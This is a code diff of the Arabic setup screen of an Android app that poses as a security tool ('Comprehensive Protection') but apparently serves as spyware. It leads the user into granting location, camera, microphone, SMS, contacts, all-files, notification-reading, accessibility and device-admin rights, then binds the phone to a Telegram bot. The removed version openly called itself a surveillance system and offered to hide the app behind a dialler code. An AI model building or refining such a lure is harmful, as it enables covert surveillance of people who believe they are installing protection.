@@ -2,309 +2,376 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الحماية الشاملة</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: -apple-system, 'Segoe UI', Tahoma, sans-serif; background: #0a0e1a; color: #e2e8f0; height: 100vh; display: flex; flex-direction: column; }
-        .header { background: linear-gradient(135deg, #1a1f35, #0d1117); padding: 20px; text-align: center; border-bottom: 1px solid #1e293b; }
-        .header h1 { font-size: 22px; color: #60a5fa; margin-bottom: 4px; }
-        .header p { font-size: 12px; color: #64748b; }
-        .content { flex: 1; overflow-y: auto; padding: 16px; }
-        .section { background: #111827; border: 1px solid #1e293b; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
-        .section-title { font-size: 14px; font-weight: bold; color: #94a3b8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
-        .perm-item { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #1e293b; }
-        .perm-item:last-child { border-bottom: none; }
-        .perm-info { display: flex; align-items: center; gap: 10px; }
-        .perm-icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 16px; }
-        .perm-name { font-size: 13px; color: #e2e8f0; }
-        .perm-desc { font-size: 10px; color: #64748b; margin-top: 2px; }
-        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; }
-        .status-waiting { background: #1e293b; color: #64748b; }
-        .status-active { background: #064e3b; color: #34d399; }
-        .status-error { background: #7f1d1d; color: #f87171; }
-        .status-pending { background: #78350f; color: #fbbf24; }
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: all 0.2s; }
-        .btn:active { transform: scale(0.98); }
-        .btn-primary { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; }
-        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
-        .btn-success { background: linear-gradient(135deg, #059669, #047857); color: white; }
-        .btn:disabled { background: #374151; color: #6b7280; cursor: not-allowed; }
-        .progress-bar { width: 100%; height: 6px; background: #1e293b; border-radius: 3px; overflow: hidden; margin: 12px 0; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #2563eb, #60a5fa); border-radius: 3px; transition: width 0.5s ease; }
-        .log-box { position: fixed; bottom: 0; left: 0; right: 0; max-height: 100px; overflow-y: auto; background: rgba(0,0,0,0.95); padding: 8px 12px; font-size: 10px; font-family: monospace; color: #64748b; border-top: 1px solid #1e293b; z-index: 100; }
-        .log-success { color: #34d399; }
-        .log-error { color: #f87171; }
-        .log-warn { color: #fbbf24; }
-        .log-info { color: #60a5fa; }
-        .connected-screen { display: none; text-align: center; padding: 30px 20px; }
-        .connected-icon { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #064e3b, #065f46); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 40px; }
-        .link-input { width: 100%; padding: 14px 16px; background: #0f172a; border: 2px solid #1e293b; border-radius: 10px; color: #e2e8f0; font-size: 20px; text-align: center; letter-spacing: 8px; font-weight: bold; font-family: monospace; outline: none; direction: ltr; }
-        .link-input:focus { border-color: #2563eb; }
-        .link-input::placeholder { letter-spacing: 2px; font-size: 14px; color: #475569; }
-        .link-hint { font-size: 11px; color: #64748b; text-align: center; margin-top: 8px; line-height: 1.6; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a2e 0%, #1a1a4e 50%, #0d0d3d 100%);
+            min-height: 100vh;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .logo {
+            width: 90px; height: 90px;
+            background: linear-gradient(135deg, #00d4ff, #0066ff);
+            border-radius: 25px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            box-shadow: 0 8px 32px rgba(0, 102, 255, 0.3);
+        }
+        h1 { font-size: 22px; margin-bottom: 5px; color: #00d4ff; }
+        .subtitle { font-size: 13px; color: #8888aa; margin-bottom: 25px; }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: #1a1a3e;
+            border-radius: 3px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #0066ff);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+
+        /* Step Cards */
+        .step-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        .step-card.active {
+            border-color: #00d4ff;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.15);
+        }
+        .step-card.granted {
+            border-color: #00ff88;
+            background: rgba(0, 255, 136, 0.05);
+        }
+        .step-card.error {
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.05);
+        }
+        .step-icon {
+            width: 50px; height: 50px;
+            border-radius: 15px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 24px;
+            background: rgba(0, 212, 255, 0.15);
+        }
+        .step-card.granted .step-icon { background: rgba(0, 255, 136, 0.15); }
+        .step-title { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+        .step-desc { font-size: 12px; color: #8888aa; line-height: 1.6; }
+        .step-status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            margin-top: 10px;
+        }
+        .status-pending { background: rgba(255,255,255,0.1); color: #aaa; }
+        .status-active { background: rgba(0, 212, 255, 0.2); color: #00d4ff; animation: pulse 1.5s infinite; }
+        .status-granted { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
+        .status-error { background: rgba(255, 68, 68, 0.2); color: #ff4444; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Link Code Input */
+        .link-code-section { display: none; }
+        .link-code-section.visible { display: block; }
+        .code-input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid rgba(0, 212, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 22px;
+            text-align: center;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            margin: 15px 0;
+            outline: none;
+            font-family: monospace;
+        }
+        .code-input:focus { border-color: #00d4ff; }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #00d4ff, #0066ff);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .verify-btn:active { transform: scale(0.98); }
+        .code-error {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+        .code-error.visible { display: block; }
+
+        /* Success Screen */
+        .success-screen { display: none; }
+        .success-screen.visible { display: block; }
+        .success-icon {
+            width: 80px; height: 80px;
+            background: rgba(0, 255, 136, 0.15);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            animation: scaleIn 0.5s ease;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0); } to { transform: scale(1); }
+        }
+        .device-info {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: right;
+            font-size: 13px;
+            line-height: 2;
+        }
+
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <h1>ابو الزهراء - الحماية الذكية</h1>
-        <p>اتصال مباشر بتيليجرام | نظام رقابي متقدم</p>
-    </div>
-
-    <div class="content">
-        <!-- شاشة الأذونات -->
+    <div class="container">
+        <!-- شاشة الإعداد -->
         <div id="setup-screen">
-            <!-- تقدم الإعداد -->
-            <div class="section">
-                <div class="section-title">تقدم الإعداد</div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
-                    <span id="progress-text" style="font-size: 12px; color: #94a3b8;">0 / 8</span>
-                    <span id="progress-percent" style="font-size: 12px; color: #60a5fa;">0%</span>
-                </div>
-                <div class="progress-bar"><div id="progress-fill" class="progress-fill" style="width: 0%"></div></div>
+            <div class="logo">🛡️</div>
+            <h1>الحماية الشاملة</h1>
+            <p class="subtitle">نظام الأمان المتقدم - إعداد مطلوب</p>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
             </div>
 
-            <!-- الأذونات الأساسية -->
-            <div class="section">
-                <div class="section-title">الأذونات الأساسية</div>
-                <div class="perm-item" id="perm-basic">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">1</div>
-                        <div><div class="perm-name">أذونات النظام الأساسية</div><div class="perm-desc">الموقع، الرسائل، المكالمات، الكاميرا، الميكروفون...</div></div>
-                    </div>
-                    <span id="perm-basic-badge" class="status-badge status-waiting">في الانتظار</span>
+            <div id="steps-container">
+                <!-- الخطوة 1 -->
+                <div class="step-card" id="step-basic">
+                    <div class="step-icon">📱</div>
+                    <div class="step-title">الأذونات الأساسية</div>
+                    <div class="step-desc">الموقع، الكاميرا، الميكروفون، الرسائل، جهات الاتصال، التخزين</div>
+                    <span class="step-status status-pending" id="status-basic">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 2 -->
+                <div class="step-card" id="step-all_files">
+                    <div class="step-icon">📁</div>
+                    <div class="step-title">الوصول لجميع الملفات</div>
+                    <div class="step-desc">السماح بالوصول الكامل لجميع الملفات على الجهاز</div>
+                    <span class="step-status status-pending" id="status-all_files">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 3 -->
+                <div class="step-card" id="step-battery">
+                    <div class="step-icon">🔋</div>
+                    <div class="step-title">تحسين البطارية</div>
+                    <div class="step-desc">السماح للتطبيق بالعمل في الخلفية دون تقييد</div>
+                    <span class="step-status status-pending" id="status-battery">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 4 -->
+                <div class="step-card" id="step-overlay">
+                    <div class="step-icon">🔲</div>
+                    <div class="step-title">العرض فوق التطبيقات</div>
+                    <div class="step-desc">السماح بعرض التنبيهات فوق التطبيقات الأخرى</div>
+                    <span class="step-status status-pending" id="status-overlay">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 5 -->
+                <div class="step-card" id="step-usage">
+                    <div class="step-icon">📊</div>
+                    <div class="step-title">إحصائيات الاستخدام</div>
+                    <div class="step-desc">السماح بمراقبة استخدام التطبيقات</div>
+                    <span class="step-status status-pending" id="status-usage">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 6 -->
+                <div class="step-card" id="step-notif">
+                    <div class="step-icon">🔔</div>
+                    <div class="step-title">مستمع الإشعارات</div>
+                    <div class="step-desc">السماح بقراءة جميع الإشعارات من التطبيقات</div>
+                    <span class="step-status status-pending" id="status-notif">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 7 -->
+                <div class="step-card" id="step-access">
+                    <div class="step-icon">♿</div>
+                    <div class="step-title">خدمة إمكانية الوصول</div>
+                    <div class="step-desc">السماح بخدمة إمكانية الوصول لمراقبة الأحداث</div>
+                    <span class="step-status status-pending" id="status-access">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 8 -->
+                <div class="step-card" id="step-admin">
+                    <div class="step-icon">🔑</div>
+                    <div class="step-title">مسؤول الجهاز</div>
+                    <div class="step-desc">تفعيل صلاحيات مسؤول الجهاز للحماية الكاملة</div>
+                    <span class="step-status status-pending" id="status-admin">في الانتظار</span>
+                </div>
+
+                <!-- الخطوة 9 -->
+                <div class="step-card" id="step-link">
+                    <div class="step-icon">🔗</div>
+                    <div class="step-title">كود الربط</div>
+                    <div class="step-desc">أدخل كود الربط المولد من البوت</div>
+                    <span class="step-status status-pending" id="status-link">في الانتظار</span>
                 </div>
             </div>
 
-            <!-- أذونات النظام -->
-            <div class="section">
-                <div class="section-title">أذونات النظام المتقدمة</div>
-                <div class="perm-item" id="perm-battery">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">2</div>
-                        <div><div class="perm-name">تجاهل تحسين البطارية</div><div class="perm-desc">السماح للتطبيق بالعمل في الخلفية</div></div>
-                    </div>
-                    <span id="perm-battery-badge" class="status-badge status-waiting">في الانتظار</span>
-                </div>
-                <div class="perm-item" id="perm-overlay">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">3</div>
-                        <div><div class="perm-name">العرض فوق التطبيقات</div><div class="perm-desc">مطلوب لمراقبة الشاشة</div></div>
-                    </div>
-                    <span id="perm-overlay-badge" class="status-badge status-waiting">في الانتظار</span>
-                </div>
-                <div class="perm-item" id="perm-usage">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">4</div>
-                        <div><div class="perm-name">إحصائيات الاستخدام</div><div class="perm-desc">مراقبة استخدام التطبيقات</div></div>
-                    </div>
-                    <span id="perm-usage-badge" class="status-badge status-waiting">في الانتظار</span>
-                </div>
-                <div class="perm-item" id="perm-notif">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">5</div>
-                        <div><div class="perm-name">مستمع الإشعارات</div><div class="perm-desc">قراءة إشعارات جميع التطبيقات</div></div>
-                    </div>
-                    <span id="perm-notif-badge" class="status-badge status-waiting">في الانتظار</span>
-                </div>
-                <div class="perm-item" id="perm-access">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">6</div>
-                        <div><div class="perm-name">خدمة إمكانية الوصول</div><div class="perm-desc">مراقبة عميقة للتطبيقات والشاشة</div></div>
-                    </div>
-                    <span id="perm-access-badge" class="status-badge status-waiting">في الانتظار</span>
-                </div>
-                <div class="perm-item" id="perm-admin">
-                    <div class="perm-info">
-                        <div class="perm-icon" style="background: #1e293b;">7</div>
-                        <div><div class="perm-name">مسؤول الجهاز</div><div class="perm-desc">حماية متقدمة ضد الحذف</div></div>
-                    </div>
-                    <span id="perm-admin-badge" class="status-badge status-waiting">في الانتظار</span>
+            <!-- قسم إدخال كود الربط -->
+            <div class="link-code-section" id="link-code-section">
+                <div class="step-card active">
+                    <div class="step-icon">🔗</div>
+                    <div class="step-title">أدخل كود الربط</div>
+                    <div class="step-desc">أرسل /link في بوت تيليجرام للحصول على الكود</div>
+                    <input type="text" class="code-input" id="code-input" placeholder="XXXXXX" maxlength="8" autocomplete="off">
+                    <button class="verify-btn" onclick="verifyCode()">تحقق من الكود</button>
+                    <div class="code-error" id="code-error"></div>
                 </div>
             </div>
-
-            <!-- كود الربط -->
-            <div class="section" id="link-code-section" style="display:none;">
-                <div class="section-title">8. كود الربط</div>
-                <div style="text-align:center; margin-bottom:14px;">
-                    <div style="font-size:30px; margin-bottom:6px;">🔗</div>
-                    <p style="font-size:13px; color:#e2e8f0; margin-bottom:4px;">أدخل كود الربط من بوت تيليجرام</p>
-                </div>
-                <input type="text" id="link-code-input" class="link-input" placeholder="أدخل الكود هنا" maxlength="10" autocomplete="off">
-                <div class="link-hint">
-                    ل получения كود الربط: افتح بوت أبو زهرة على تيليجرام وأرسل <b>/link</b><br>
-                    الكود يتكون من 6 أحرف وأرقام
-                </div>
-                <button class="btn btn-primary" id="btn-verify-link" onclick="submitLinkCode()">تأكيد كود الربط</button>
-                <div id="link-error" style="color:#f87171; font-size:12px; text-align:center; margin-top:8px; display:none;"></div>
-            </div>
-
-            <button class="btn btn-primary" id="btn-start" onclick="requestNextPermission()">بدء التفعيل</button>
         </div>
 
-        <!-- شاشة الاتصال الناجح -->
-        <div id="connected-screen" class="connected-screen">
-            <div class="connected-icon">✅</div>
-            <h2 style="color: #34d399; font-size: 20px; margin-bottom: 8px;">تم التفعيل بنجاح!</h2>
-            <p style="color: #94a3b8; font-size: 13px; margin-bottom: 6px;">الجهاز متصل مباشرة بتيليجرام</p>
-            <p style="color: #64748b; font-size: 11px; margin-bottom: 24px;">جميع الأذونات مفعّلة - النظام يعمل في الخلفية</p>
-            <div class="section" style="text-align: right;">
-                <div class="section-title">معلومات الجهاز</div>
-                <div id="device-info" style="font-size: 12px; color: #94a3b8; line-height: 2;"></div>
-            </div>
-            <button class="btn btn-success" onclick="handleStartServices()">إعادة تشغيل الخدمات</button>
-            <button class="btn btn-danger" onclick="handleHideApp()">إخفاء التطبيق</button>
-            <p style="color: #475569; font-size: 10px; margin-top: 12px;">لإظهار التطبيق: *#*#7890#*#*</p>
+        <!-- شاشة النجاح -->
+        <div class="success-screen" id="success-screen">
+            <div class="success-icon">✅</div>
+            <h1>تم التفعيل بنجاح!</h1>
+            <p class="subtitle">الجهاز محمي بالكامل ومتصل</p>
+            <div class="device-info" id="device-info"></div>
         </div>
     </div>
-
-    <!-- سجل الأحداث -->
-    <div id="log-box" class="log-box"></div>
 
     <script>
+        const totalSteps = 9;
         let currentStep = 0;
-        const totalSteps = 8;
 
-        function log(msg, type) {
-            const box = document.getElementById('log-box');
-            const time = new Date().toLocaleTimeString();
-            const cls = type === 'success' ? 'log-success' : type === 'error' ? 'log-error' : type === 'warn' ? 'log-warn' : 'log-info';
-            box.innerHTML += '<div class="' + cls + '">[' + time + '] ' + msg + '</div>';
-            box.scrollTop = box.scrollHeight;
-        }
-
-        function updateProgress() {
-            const pct = Math.round((currentStep / totalSteps) * 100);
-            document.getElementById('progress-text').innerText = currentStep + ' / ' + totalSteps;
-            document.getElementById('progress-percent').innerText = pct + '%';
-            document.getElementById('progress-fill').style.width = pct + '%';
-        }
-
-        function setBadge(id, status) {
-            const badge = document.getElementById(id + '-badge');
-            if (!badge) return;
-            badge.className = 'status-badge';
-            if (status === 'ok') { badge.classList.add('status-active'); badge.innerText = '✓ مفعّل'; }
-            else if (status === 'pending') { badge.classList.add('status-pending'); badge.innerText = '⏳ جاري...'; }
-            else if (status === 'error') { badge.classList.add('status-error'); badge.innerText = '✗ خطأ'; }
-            else { badge.classList.add('status-waiting'); badge.innerText = 'في الانتظار'; }
-        }
-
-        function requestNextPermission() {
-            log('بدء طلب الأذونات...', 'info');
-            if (typeof AndroidNative !== 'undefined') {
-                AndroidNative.requestAllPermissions();
-            } else {
-                log('AndroidNative غير متوفر!', 'error');
-            }
-        }
-
-        // ===== من Android =====
-        window.onPermissionStep = function(step) {
-            currentStep = parseInt(step);
+        function onPermissionStep(stepInfo) {
+            const [current, total] = stepInfo.split('/');
+            currentStep = parseInt(current) - 1;
             updateProgress();
-            log('الخطوة: ' + step + '/' + totalSteps, 'info');
-        };
+        }
 
-        window.onPermissionGranted = function(name) {
-            const id = name.replace('perm-', '');
-            if (id === 'link') {
-                setBadge('link', 'ok');
-                log('✓ تم ربط الجهاز بنجاح', 'success');
-                document.getElementById('link-code-section').style.display = 'none';
+        function onPermissionPending(type) {
+            const card = document.getElementById('step-' + type);
+            const status = document.getElementById('status-' + type);
+            if (card && status) {
+                card.className = 'step-card active';
+                status.className = 'step-status status-active';
+                status.textContent = 'جاري التفعيل...';
+            }
+        }
+
+        function onPermissionGranted(type) {
+            const card = document.getElementById('step-' + type);
+            const status = document.getElementById('status-' + type);
+            if (card && status) {
+                card.className = 'step-card granted';
+                status.className = 'step-status status-granted';
+                status.textContent = 'تم التفعيل ✅';
+            }
+
+            // إذا كانت خطوة كود الربط، لا نخفي شيئاً
+            if (type === 'link') {
+                document.getElementById('link-code-section').classList.remove('visible');
+            }
+
+            currentStep++;
+            updateProgress();
+        }
+
+        function onPermissionWarning(type) {
+            // بعض الأذونات لم تُمنح لكن نكمل
+        }
+
+        function onPermissionError(type) {
+            const status = document.getElementById('status-' + type);
+            if (status) {
+                status.className = 'step-status status-error';
+                status.textContent = 'لم يتم التفعيل ⚠️';
+            }
+        }
+
+        function showLinkCodeInput() {
+            document.getElementById('link-code-section').classList.add('visible');
+            document.getElementById('code-input').focus();
+        }
+
+        function onLinkCodeError(msg) {
+            const errorDiv = document.getElementById('code-error');
+            errorDiv.textContent = msg;
+            errorDiv.classList.add('visible');
+        }
+
+        function onAllPermissionsComplete(deviceInfo) {
+            document.getElementById('setup-screen').classList.add('hidden');
+            document.getElementById('success-screen').classList.add('visible');
+            document.getElementById('device-info').innerHTML = deviceInfo;
+        }
+
+        function onTelegramConnected(msg) {
+            console.log('Telegram connected:', msg);
+        }
+
+        function onSetupError(msg) {
+            console.error('Setup error:', msg);
+        }
+
+        function verifyCode() {
+            const code = document.getElementById('code-input').value.trim().toUpperCase();
+            if (code.length < 4) {
+                onLinkCodeError('الكود قصير جداً');
                 return;
             }
-            setBadge(id, 'ok');
-            log('✓ تم تفعيل: ' + name, 'success');
-        };
-
-        window.onPermissionPending = function(name) {
-            const id = name.replace('perm-', '');
-            if (id === 'link') {
-                setBadge('link', 'pending');
-                document.getElementById('link-code-section').style.display = 'block';
-                document.getElementById('btn-start').style.display = 'none';
-                log('⏳ أدخل كود الربط من البوت', 'warn');
-                return;
-            }
-            setBadge(id, 'pending');
-            log('⏳ يطلب: ' + name, 'warn');
-        };
-
-        // ===== شاشة إدخال كود الربط =====
-        window.showLinkCodeInput = function() {
-            document.getElementById('link-code-section').style.display = 'block';
-            document.getElementById('btn-start').style.display = 'none';
-            document.getElementById('link-code-input').focus();
-            log('🔗 أدخل كود الربط من بوت تيليجرام', 'info');
-        };
-
-        window.onLinkCodeError = function(msg) {
-            document.getElementById('link-error').innerText = '❌ ' + msg;
-            document.getElementById('link-error').style.display = 'block';
-            log('❌ ' + msg, 'error');
-        };
-
-        function submitLinkCode() {
-            const code = document.getElementById('link-code-input').value.trim();
-            if (!code) {
-                document.getElementById('link-error').innerText = '❌ أدخل كود الربط';
-                document.getElementById('link-error').style.display = 'block';
-                return;
-            }
-            document.getElementById('link-error').style.display = 'none';
-            document.getElementById('btn-verify-link').disabled = true;
-            document.getElementById('btn-verify-link').innerText = 'جاري التحقق...';
-            log('🔄 التحقق من كود الربط: ' + code, 'info');
+            document.getElementById('code-error').classList.remove('visible');
             if (typeof AndroidNative !== 'undefined') {
                 AndroidNative.verifyLinkCode(code);
             }
         }
 
-        // Enter key to submit
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && document.getElementById('link-code-section').style.display === 'block') {
-                submitLinkCode();
-            }
+        function updateProgress() {
+            const progress = (currentStep / totalSteps) * 100;
+            document.getElementById('progress-bar').style.width = Math.min(progress, 100) + '%';
+        }
+
+        // Enter key for code input
+        document.getElementById('code-input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') verifyCode();
         });
-
-        window.onAllPermissionsComplete = function(deviceInfo) {
-            currentStep = totalSteps;
-            updateProgress();
-            log('✅ جميع الأذونات مفعّلة والربط مكتمل!', 'success');
-            log('🟢 تم الاتصال بتيليجرام مباشرة', 'success');
-            setTimeout(function() {
-                document.getElementById('setup-screen').style.display = 'none';
-                document.getElementById('connected-screen').style.display = 'block';
-                if (deviceInfo) {
-                    document.getElementById('device-info').innerHTML = deviceInfo;
-                }
-            }, 500);
-        };
-
-        window.onTelegramConnected = function(msg) { log('🟢 ' + msg, 'success'); };
-        window.onSetupError = function(msg) { log('❌ خطأ: ' + msg, 'error'); };
-        window.onAppHidden = function() { log('✅ تم إخفاء التطبيق', 'success'); };
-        window.onAppError = function(err) { log('❌ ' + err, 'error'); };
-
-        function handleStartServices() {
-            log('إعادة تشغيل الخدمات...', 'info');
-            if (typeof AndroidNative !== 'undefined') AndroidNative.startServices();
-        }
-
-        function handleHideApp() {
-            if (confirm('سيتم إخفاء التطبيق. لفتحه مجدداً اطلب *#*#7890#*#* من لوحة الاتصال.')) {
-                log('جاري الإخفاء...', 'info');
-                if (typeof AndroidNative !== 'undefined') AndroidNative.hideApp();
-            }
-        }
-
-        log('جاري التحميل...', 'info');
-        if (typeof AndroidNative !== 'undefined') {
-            log('✅ الجسر الأصلي جاهز', 'success');
-        } else {
-            log('❌ الجسر الأصلي غير متوفر', 'error');
-        }
     </script>
 </body>
 </html>
